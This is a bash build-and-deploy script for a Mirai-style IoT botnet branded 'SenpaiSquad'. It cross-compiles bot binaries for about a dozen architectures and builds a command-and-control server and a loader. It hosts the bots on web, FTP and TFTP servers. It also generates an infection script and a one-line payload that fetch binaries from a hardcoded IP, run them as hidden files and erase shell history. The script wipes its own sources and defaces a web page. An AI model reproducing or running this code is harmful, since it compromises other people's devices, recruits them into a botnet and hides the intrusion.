#!/bin/bash
## 207.154.230.59 La asta dai find si replace all cu ip tau
export PATH=$PATH:/etc/xcompile/arc/bin
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/i686/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

function compile_bot_arm7 {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

rm -rf /var/www/html/*
rm -rf /var/ftp/*
rm -rf /var/lib/tftpboot/*
rm -rf ~/release
mkdir ~/release
mkdir /var/www/html/.billgates
go build -o loader/scanListen scanListen.go
rm -rf ~/scanListen.go
go build -o loader/cnc cnc/*.go
rm -rf ~/cnc
mv ~/loader/cnc ~/

######################################################################################################
#                                        SenpaiSquad COMPILE STAGE                                   #
######################################################################################################
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCheck\x1b[0;37m] \x1b[0;31- \x1b[0;37m Compiler bins.\n"
printf "\n"
printf "\n"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m x86.\n"
compile_bot i586 b4ngl4d3shS3N941.x86 "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m mips.\n"
compile_bot mips b4ngl4d3shS3N941.mips "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m mipsel.\n"
compile_bot mipsel b4ngl4d3shS3N941.mpsl "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm.\n"
compile_bot armv4l b4ngl4d3shS3N941.arm "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm5.\n"
compile_bot armv5l b4ngl4d3shS3N941.arm5 "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm6.\n"
compile_bot armv6l b4ngl4d3shS3N941.arm6 "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m arm7.\n"
compile_bot_arm7 armv7l b4ngl4d3shS3N941.arm7 "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m powerpc.\n"
compile_bot powerpc b4ngl4d3shS3N941.ppc "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m spc.\n"
compile_bot sparc b4ngl4d3shS3N941.spc "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m m68k.\n"
compile_bot m68k b4ngl4d3shS3N941.m68k "-static"
printf "\x1b[0;37m[\x1b[0;31mCompilez\x1b[0;37m] \x1b[0;31- \x1b[0;37m sh4.\n"
compile_bot sh4 b4ngl4d3shS3N941.sh4 "-static"

######################################################################################################

cp release/* /var/www/html/.billgates
cp release/* /var/ftp
cp release/* /var/lib/tftpboot
rm -rf release


gcc -static -O3 -lpthread -pthread ~/loader/src/*.c -o ~/loader/loader


######################################################################################################

armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm
armv5l-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm5
armv6l-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm6
armv7l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.arm7
i586-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.x86
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mips
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.sh4
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.spc
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static ~/dlr/main.c -o ~/dlr/release/dlr.m68k

armv4l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm
armv5l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm5
armv6l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm6
armv7l-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.arm7
i586-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.x86
mips-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mips
mipsel-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.mpsl
powerpc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.ppc
sh4-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.sh4
sparc-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.spc
m68k-strip -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ~/dlr/release/dlr.m68k
mv ~/dlr/release/dlr* ~/loader/bins
rm -rf ~/dlr ~/loader/src ~/bot ~/Projects ~/build.sh

echo '#!/bin/bash
rm -rf /var/tmp/*
rm -rf /var/tmp/.*
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.x86 ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.x86 ; chmod 777 b4ngl4d3shS3N941.x86 ; mv b4ngl4d3shS3N941.x86 .02151523fds ; ./.02151523fds $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.x86 .02151523fds
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.mips ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.mips ; chmod 777 b4ngl4d3shS3N941.mips ; mv b4ngl4d3shS3N941.mips .02151523fd66s ; ./.02151523fd66s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.mips .02151523fd66s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.mpsl ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.mpsl ; chmod 777 b4ngl4d3shS3N941.mpsl ; mv b4ngl4d3shS3N941.mpsl .02151523fd62s ; ./.02151523fd62s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.mpsl .02151523fd62s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm ; chmod 777 b4ngl4d3shS3N941.arm ; mv b4ngl4d3shS3N941.arm .02151523fd55s ; ./.02151523fd55s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.arm .02151523fd55s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm5 ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm5 ; chmod 777 b4ngl4d3shS3N941.arm5 ; mv b4ngl4d3shS3N941.arm5 .02151523fd44s ; ./.02151523fd44s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.arm5 .02151523fd44s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm6 ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm6 ; chmod 777 b4ngl4d3shS3N941.arm6 ; mv b4ngl4d3shS3N941.arm6 .02151523fd11s ; ./.02151523fd11s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.arm6 .02151523fd11s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm7 ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.arm7 ; chmod 777 b4ngl4d3shS3N941.arm7 ; mv b4ngl4d3shS3N941.arm7 .02151523fd12s ; ./.02151523fd12s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.arm7 .02151523fd12s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.ppc ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.ppc ; chmod 777 b4ngl4d3shS3N941.ppc ; mv b4ngl4d3shS3N941.ppc .02151523fd21s ; ./.02151523fd21s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.ppc .02151523fd21s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.spc ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.spc ; chmod 777 b4ngl4d3shS3N941.spc ; mv b4ngl4d3shS3N941.spc .02151523fd31s ; ./.02151523fd31s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.spc .02151523fd31s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.m68k ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.m68k ; chmod 777 b4ngl4d3shS3N941.m68k ; mv b4ngl4d3shS3N941.m68k .02151523fd51s ; ./.02151523fd51s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.m68k .02151523fd51s
fi
if cd /tmp ; wget -bq --no-check-certificate 207.154.230.59/.billgates/b4ngl4d3shS3N941.sh4 ; curl -s -L -O 207.154.230.59/.billgates/b4ngl4d3shS3N941.sh4 ; chmod 777 b4ngl4d3shS3N941.sh4 ; mv b4ngl4d3shS3N941.sh4 .02151523fd52s ; ./.02151523fd52s $1 2>&1 | grep "Who loves the sun"
then
printf "\n\033[0m\033[2;49;35mSenpaiSquad\033[0m\033[1;49;96m!\033[0m\n"
exit;
else
rm -rf b4ngl4d3shS3N941.sh4 .02151523fd52s
fi
' > /var/www/html/.billgates/.senpai.loader

echo "<center>*************************<br>SenpaiSquad Date Private. Daca vezi asta si esti un cautator de IoT atunci suge-o -UzzYSenpai.<br>*************************</center>" >> /var/www/html/index.html

echo "Payload Senpai : cd /var/tmp ; curl -s -L -O 207.154.230.59/.billgates/.senpai.loader || wget --no-check-certificate 207.154.230.59/.billgates/.senpai.loader ; chmod 777 .senpai.loader ; ./.senpai.loader ; rm -rf .senpai.loader ; history -c ; rm -rf ~/.bash_history"